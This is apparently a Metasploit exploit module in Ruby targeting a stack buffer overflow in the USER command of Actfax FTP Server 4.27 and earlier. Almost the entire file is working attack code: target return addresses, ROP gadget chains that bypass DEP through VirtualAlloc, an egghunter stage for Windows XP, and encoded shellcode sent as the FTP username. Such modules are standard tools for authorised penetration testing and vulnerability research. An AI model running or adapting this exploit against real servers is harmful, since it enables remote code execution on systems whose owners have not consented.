##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
        Rank = GreatRanking

        include Msf::Exploit::Remote::Ftp
        include Msf::Exploit::Remote::Egghunter

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Actfax FTP Server <= v4.27 USER Command Stack Buffer Overflow',
                        'Description'    => %q{
                                        This module exploits a stack-based buffer overflow in actfax ftp Server
                                version 4.27 and earlier. Actfax fails to check input size when parsing 'USER' command.
                                This vulnerability results in arbitray code execution. This module has been designed to
                                bypass DEP under Windows Server 2003 SP2/R2.
                        },
                        'Author'         =>
                                [
                                        'mr_me - twitter.com/net__ninja & mrme.mythsec<at>gmail.com',   # found/wrote msf module
                                        'chap0 - chap0.mythsec<at>gmail.com',                           # for the original versions
                                ],
                        'License'        => MSF_LICENSE,
                        'Version'        => '$Revision: 12540 $',
                        'References'     =>
                                [
                                        [ 'OSVDB', '72520' ],
                                        [ 'URL', 'http://www.exploit-db.com/exploits/16177/' ]
                                ],
                        'DefaultOptions' =>
                                {
                                        'EXITFUNC' => 'thread'
                                },
                        'Privileged'     => false,
                        'Payload'        =>
                                {
                                        'Space'    => 600,
                                        'DisableNops' => true,
                                        'EncoderType'     => Msf::Encoder::Type::AlphanumMixed,
                                },
                        'Platform'       => 'win',
                        'Targets'        =>
                                [
                                        # Server 2003 DEP bypass targets (fully tested)
                                        [ 'Windows Server 2003 + DEP bypass - NTDLL v5.2.3790.4789',   { 'Ret' => 0x7C813C8F } ], # MOV ESP,EBP; POP EBP; RETN [ntdll.dll]
                                        [ 'Windows Server 2003 + DEP bypass - NTDLL v5.2.3790.3959',   { 'Ret' => 0x7C813DE7 } ], # MOV ESP,EBP; POP EBP; RETN [ntdll.dll]
                                        # NON DEP Bypass target (fully tested)
                                        [ 'Windows XP SP3 - Universal',   { 'Ret' => 0x004021C5 } ], # CALL EDI [ActSrvNT.exe]
                                ],
                        'DisclosureDate' => 'Jul 31 2011',
                        'DefaultTarget' => 0))

        end

        def check
                connect
                disconnect

                if (banner =~ /Version 4.27/ || banner =~ /Version 4.25/)
                        return Exploit::CheckCode::Vulnerable
                end
                        return Exploit::CheckCode::Safe
        end

        def get_encoded_payload(p, reg)
                encoder = framework.encoders.create("x86/alpha_mixed")
                encoder.datastore.import_options_from_hash( {'BufferRegister'=>reg} )
                rencoded_payload = encoder.encode(p, nil, nil, platform)
                return rencoded_payload
        end

        def junk
                return rand_text_alpha(4).unpack("L")[0].to_i
        end

        def exploit
                connect

                if (target.name =~ /Server 2003/)
                        sc = get_encoded_payload(payload.encoded, "ESP")

                        # specially aligned RETN
                        rop_stage1  = "\x42\x28\x5f"                    # RETN [htnetcfg.dll]
                        rop_stage1  += [0x5f282336].pack("V*") * 51     # RETN [htnetcfg.dll]

                        # All rop stage 1 instructions are from htnetcfg.dll
                        # Tested versions 5.2.3790.3959 &
                        # which seem to be universal across all windows server 2003 SP's
                        rop_stage1 +=
                        [
                                0x5F29C7F8,     # POP EAX; POP ESI; POP EBP; RETN 8
                                0x5F2B5DC3,     # ptr to 0x00001000
                                junk,           # JUNK
                                0x5f29aa95,     # p2p that is writable, we also -0c to accommodate
                                0x5F2A32DA,     # MOV EDX,DWORD PTR DS:[EAX]; JUNK; JUNK; JUNK; JUNK; JUNK; JUNK; RETN 8
                                junk,           # JUNK
                                junk,           # JUNK
                                junk,           # JUNK
                                0x5f282336,     # RETN
                                junk,           # JUNK
                                junk,           # JUNK
                        ].pack("V*")

                        # jump over the below stack alignment (Dont POP EDI)
                        rop_stage1 += [0x5F2A345D].pack("V*")   # POP ECX; POP EBP; RETN [htnetcfg.dll]

                        # rop_stage1 + stack_alignment to realign after retn address
                        rop_stage1 += rand_text_alpha(1)
                        stack_alignment = rand_text_alpha(3)

                        # We have to be smart on how we use gadgets.
                        # Almost a universal dep bypass as most ptrs are from "ActSrvNT.exe".
                        # We can use null bytes 0x00 due to character conversion of 0x20!
                        # Also, we waste ~208 bytes in payload space but thanks to nulls, we are saved!
                        # EDX already contains = 1000 from flAllocationType (rop_stage1)
                        rop_stage2 =
                        [
                                0x204C2135,     # POP EAX; RETN
                                0x2051E1B0,     # IAT -> VirtualAlloc
                                0x2051D7A1,     # MOV EAX,DWORD PTR DS:[EAX]; RETN
                                0x2040A4A0,     # POP EBX; RETN
                                0x2040A4A0,     # POP EBX; RETN
                                0x20422E7D,     # MOV ESI,EAX; CALL EBX
                                0x2040F2c2,     # POP EBP; POP EBX; RETN
                                0x204A5DED,     # JMP ESP
                                0x20202120,     # dwSize
                                0x204C2135,     # POP EAX; RETN
                                0x44444444,     # INC ESP before sc (getPC)
                                0x20415D7A,     # POP EDI; POP ECX; RETN
                                0x20404A3F,     # RETN
                                0x20202040,     # flProtect
                                0x2045AB53,     # PUSHAD; RETN
                        ].pack("V*")

                        print_status("Targeting %s" % target.name)
                        sploit = rop_stage1
                        sploit << [target.ret].pack("V")
                        sploit << stack_alignment
                        sploit << rop_stage2
                        sploit << sc
                        sploit << rand_text_alpha((990-sploit.length))

                else
                        eggoptions =
                        {
                                :checksum => false,
                                :eggtag => 'lulz',
                        }

                        # double encoded msf shellcode trick
                        sc = get_encoded_payload(payload.encoded, "EDI")
                        hunter,egg = generate_egghunter(sc, nil, eggoptions)

                        # encode our hunter
                        hunter = get_encoded_payload(hunter, "EDI")
                        print_status("Targeting %s" % target.name)
                        print_status("Sending stage 1 exploit buffer...")
                        send_cmd(['USER', 'anonymous'], true)
                        send_cmd(['PASS', egg], false)

                        sploit = hunter
                        sploit << rand_text_alpha(256-sploit.length)
                        sploit << [target.ret].pack("V")

                        # connect again ;)
                        connect
                end

                # profit
                send_cmd(['USER', sploit] , false)
                handler
                disconnect

        end

end